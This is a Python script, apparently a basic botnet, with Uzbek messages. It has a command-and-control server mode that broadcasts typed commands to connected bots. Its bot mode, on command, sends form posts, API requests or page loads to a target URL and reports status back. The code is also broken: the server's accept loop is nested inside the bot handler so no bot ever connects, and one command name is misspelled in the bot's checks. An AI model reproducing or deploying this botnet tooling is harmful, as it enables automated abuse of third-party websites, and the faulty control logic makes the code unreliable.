import socket
import threading
import time
import requests
import logging
import sys

# Logging sozlash
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

# C&C Server
def run_server(host='127.0.0.1', port=9999):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(10)
    logging.info(f"C&C Server {host}:{port} da ishga tushdi")

    bots = []

    def handle_bot(bot_socket, addr):
        logging.info(f"Yangi bot ulandi: {addr}")
        bots.append(bot_socket)

        while True:
            try:
                data = bot_socket.recv(1024).decode()
                if not data:
                    logging.info(f"Bot {addr} uzildi")
                    bots.remove(bot_socket)
                    break
                logging.info(f"Bot {addr} dan xabar: {data}")
            except:
                bots.remove(bot_socket)
                break
        while True:
            bot_socket, addr = server.accept()
            bot_handler = threading.Thread(target=handle_bot, args=(bot_socket, addr))
            bot_handler.start()

            print("\nBuyruqlar: 'forma_yubor <xabar>', 'api_yubor <harakat>', 'sahifa_och', 'status', 'toxta'")
            command = input("Buyruq kiritng: ")
            for bot in bots:
                try:
                    bot.send(command.encode())
                    logging.info(f"Buyruq yuborildi: {command}")
                except:
                    bots.remove(bot)
                    logging.error(f"Bot {addr} bilan bog'lanishda xato")

def run_bot(server_host='127.0.0.1', server_port=9999):
    bot = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        bot.connect((server_host, server_port))
        logging.info(f"Bot {server_host}:{server_port} ga ulandi")
    except:
        logging.error(f"Serverga ulani bolmadi")
        return
    def send_form(url, message):
        try:
            response = requests.post(f"{url}", data={'message': message})
            logging.info(f"Forma yuborildi: {message}, Javop: {response.json()}")
            bot.send(f"Forma yuborildi: {message}".encode())
        except:
            logging.error(f"Forma yuborip bolmadi: {message}")
            bot.send(f"Forma yuborishda xato".encode())
    def send_api(url, action):
        try:
            response = requests.get(f"{url}/api/action", json={'action': action})
            logging.info(f"API yuborildi: {action}, Javop: {response.json()}")
            bot.send(f"API yuborildi: {action}".encode())
        except:
            logging.error(f"API yuborip bolmadi: {action}")
            bot.send(f"API yuborishda xato".encode())

    def open_page(url):
        try:
            response = requests.get(url)
            logging.info(f"Sahifa ochildi: {url}, Javop: {response.status_code}")
            bot.send(f"Sahifa ochildi: {url}".encode())
        except:
            logging.error(f"Sahifa ochishda xato: {url}")
            bot.send(f"Sahifa ochishda xato".encode())
    while True:
        try:
            command = bot.recv(1024).decode()
            if not command:
                logging.info("Server to'xtatildi")
                break
            test_url =  "https://127.0.0.1:5000"
            if command.startswith("forma_yubor"):
                message = " ".join(command.split()[1:])
                send_form(test_url, message)
            elif command.startswith("api_yubor"):
                action = " ".join(command.split()[1:])
                send_api(test_url, action)
            elif command == "Saxifa_och":
                open_page(test_url)
            elif command  == "status":
                bot.send(f"Bot{bot.getsockname()} faol, vaqti: {time.ctime()}".encode())
                logging.info("Status yuborildi")
            elif command  == "toxta":
                logging.info("Harakat to'xtatildi")
        except:
            logging.info("Server bilan aloqa uzildi")
            break
    bot.close()

# Asosiy funksiya
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Foydalanish: python botnet_control.py [server|bot]")
        sys.exit(1)

    mode = sys.argv[1]
    if mode == "server":
        run_server()
    elif mode == "bot":
        run_bot()
    else:
        print("Noto‘g‘ri rejim! ‘server’ yoki ‘bot’ deb yozing.")